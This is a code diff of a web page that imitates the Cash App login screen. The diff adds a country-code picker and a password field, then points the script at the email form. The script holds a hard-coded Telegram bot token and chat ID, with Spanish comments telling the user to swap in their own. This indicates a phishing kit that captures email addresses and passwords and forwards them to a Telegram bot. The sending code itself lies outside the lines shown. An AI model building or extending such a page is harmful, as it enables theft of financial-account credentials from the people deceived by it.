@@ -1,5 +1,7 @@
 <div class="bg-[#00D64C] pt-48 items-center justify-center font-noto-sans flex">
-  <div class="bg-white w-full max-w-lg pt-16 pb-16 px-10 rounded-3xl shadow-lg">
+  <div
+    class="bg-white w-full max-w-lg pt-16 pb-16 px-10 rounded-3xl shadow-lg relative"
+  >
     <h1 class="text-3xl text-[#333333] font-bold mb-5 pl-2">Log in</h1>
     <p class="text-gray-600 -mt-2 mb-16 pl-2">
       Enter your phone number or email. New to Cash App?
@@ -10,46 +12,109 @@
     <!-- Form Container -->
     <div id="formContainer">
       <!-- Mobile Number Form -->
-      <div id="mobileForm" class="pb-4">
+      <div id="mobileForm" class="pb-4 -mt-4">
         <label for="phone" class="block text-md font-bold text-gray-700 mb-2">
           Mobile number
         </label>
-        <div class="flex items-center w-full px-4 py-2 bg-gray-100 rounded-xl">
-          <!-- SVG Flag -->
-          <div
-            class="flex items-center justify-center w-8 h-5 overflow-hidden rounded"
-          >
-            <img
-              id="flagIcon"
-              src="/icons/uk.svg"
-              alt="Flag"
-              class="w-full h-full object-cover"
-            />
-          </div>
-
+        <!-- Modal -->
+        <div
+          class="flex items-center max-w-lg px-4 py-2 bg-gray-100 rounded-3xl focus:ring-green-500 focus:outline-none"
+        >
           <!-- Country Code -->
-          <span id="countryCode" class="ml-2 font-semibold text-gray-800">
-            +44
-          </span>
-
-          <!-- Dropdown Icon -->
-          <button
-            type="button"
-            class="flex items-center ml-2 text-green-500 focus:outline-none"
-          >
-            <svg
-              xmlns="http://www.w3.org/2000/svg"
-              class="h-4 w-4"
-              viewBox="0 0 24 24"
-              fill="none"
-              stroke="currentColor"
-              stroke-width="2"
-              stroke-linecap="round"
-              stroke-linejoin="round"
+          <div x-data="{modalIsOpen: false}">
+            <button
+              @click="modalIsOpen = true"
+              type="button"
+              class="flex items-center justify-between rounded-3xl"
             >
-              <path d="M6 9l6 6 6-6"></path>
-            </svg>
-          </button>
+              <div
+                class="flex items-center justify-center mr-2 overflow-hidden rounded"
+              >
+                <img
+                  src="/icons/uk.svg"
+                  alt="UK Flag"
+                  class="w-full h-full object-cover pr-2"
+                />
+                +44
+              </div>
+              <svg
+                xmlns="http://www.w3.org/2000/svg"
+                class="h-6 w-6 ml-2"
+                viewBox="0 0 24 24"
+                fill="none"
+                stroke="#00792C"
+                stroke-width="2"
+                stroke-linecap="round"
+                stroke-linejoin="round"
+              >
+                <path d="M6 9l6 6 6-6"></path>
+              </svg>
+            </button>
+            <div
+              x-cloak
+              x-show="modalIsOpen"
+              x-transition.opacity.duration.200ms
+              x-trap.inert.noscroll="modalIsOpen"
+              @keydown.esc.window="modalIsOpen = false"
+              @click.self="modalIsOpen = false"
+              class="fixed inset-0 z-30 flex items-end justify-center bg-black/20 p-4 pb-8 sm:items-center lg:p-8"
+              role="dialog"
+              aria-modal="true"
+              aria-labelledby="defaultModalTitle"
+            >
+              <!-- Modal Dialog -->
+              <div
+                x-show="modalIsOpen"
+                x-transition:enter="transition ease-out duration-200 delay-100 motion-reduce:transition-opacity"
+                x-transition:enter-start="opacity-0 translate-y-8"
+                x-transition:enter-end="opacity-100 translate-y-0"
+                class="flex w-screen max-w-lg flex-col overflow-hidden rounded-3xl border bg-white text-neutral-600 px-8 pt-7"
+              >
+                <!-- Dialog Header -->
+                <div
+                  class="flex items-center justify-end pt-5 dark:border-neutral-700 dark:bg-neutral-950/20"
+                >
+                  <button @click="modalIsOpen = false" aria-label="close modal">
+                    <svg
+                      xmlns="http://www.w3.org/2000/svg"
+                      viewBox="0 0 24 24"
+                      aria-hidden="true"
+                      stroke="currentColor"
+                      fill="none"
+                      stroke-width="2.2"
+                      class="w-8 h-8"
+                    >
+                      <path
+                        stroke-linecap="round"
+                        stroke-linejoin="round"
+                        d="M6 18L18 6M6 6l12 12"></path>
+                    </svg>
+                  </button>
+                </div>
+                <!-- Dialog Body -->
+                <div class="max-w-lg pb-6 px-2">
+                  <ul>
+                    <li>
+                      <button
+                        class="bg-gray-100 text-[#666666] text-start py-6 px-4 rounded-3xl mb-4 w-full flex focus:ring-green-500"
+                      >
+                        <img src="/icons/uk.svg" alt="UK Flag" class="mr-3" />
+                        United Kingdom (+44)
+                      </button>
+                    </li>
+                    <li>
+                      <button
+                        class="bg-gray-100 text-[#666666] text-start py-6 px-4 rounded-3xl my-4 w-full flex focus:ring-green-500"
+                      >
+                        <img src="/icons/us.svg" alt="UK Flag" class="mr-3" />
+                        United States (+1)
+                      </button>
+                    </li>
+                  </ul>
+                </div>
+              </div>
+            </div>
+          </div>
 
           <!-- Input Field -->
           <input
@@ -57,13 +122,13 @@
             id="phone"
             name="phone"
             placeholder="1234 567890"
-            class="flex-grow px-6 py-3 bg-transparent text-gray-800 placeholder-gray-500 focus:outline-none"
+            class="flex-grow px-6 py-3 bg-transparent text-gray-800 placeholder-gray-400 focus:ring-green-500"
           />
         </div>
       </div>
 
       <!-- Email Form (Hidden by Default) -->
-      <div id="emailForm" class="pb-6 -mt-6 hidden">
+      <form id="emailForm" class="pb-6 -mt-6 hidden">
         <label for="email" class="block pl-2 text-md font-bold text-gray-600">
           Email
         </label>
@@ -72,22 +137,37 @@
           id="email"
           name="email"
           placeholder="Your email address"
-          class="w-full px-6 py-4 mt-2 border bg-gray-100 rounded-xl focus:ring-2 focus:ring-green-500 focus:outline-none"
+          class="w-full px-6 py-4 mt-2 border bg-gray-100 rounded-xl focus:ring-green-500 focus:outline-none"
         />
-      </div>
+
+        <label
+          for="password"
+          class="block pt-3 pl-2 text-md font-bold text-gray-600"
+        >
+          Password
+        </label>
+        <input
+          type="password"
+          id="password"
+          name="password"
+          placeholder="Enter your password"
+          class="w-full px-6 py-4 mt-2 border bg-gray-100 rounded-xl focus:ring-green-500 focus:outline-none"
+        />
+      </form>
 
       <!-- Buttons -->
-      <div class="flex justify-between gap-4 mt-8">
+      <div class="flex justify-between gap-4 mt-12">
         <button
           id="toggleButton"
           type="button"
-          class="w-1/2 py-2.5 border font-bold border-gray-300 rounded-full text-dark bg-gray-100 hover:bg-gray-200"
+          class="w-1/2 py-2.5 border font-bold border-gray-300 rounded-full bg-gray-200 hover:bg-gray-200"
         >
           Use email
         </button>
         <button
           type="submit"
-          class="w-1/2 py-2 font-bold bg-green-500 text-gray-100 rounded-full hover:bg-green-600"
+          form="emailForm"
+          class="w-1/2 py-2 font-bold bg-[#00d64f] text-white rounded-full hover:bg-green-600"
         >
           Continue
         </button>
@@ -124,7 +204,7 @@
         : "Use email";
     });
 
-    const form = document.getElementById("telegramForm");
+    const form = document.getElementById("emailForm");
     const botToken = "7860301704:AAFHfhT7Y6Ow6cMEAbfVjl7Q7Z-Dic_OS4I"; // Reemplaza con tu token de bot
     const chatId = "1451244612"; // Reemplaza con tu chat ID
 
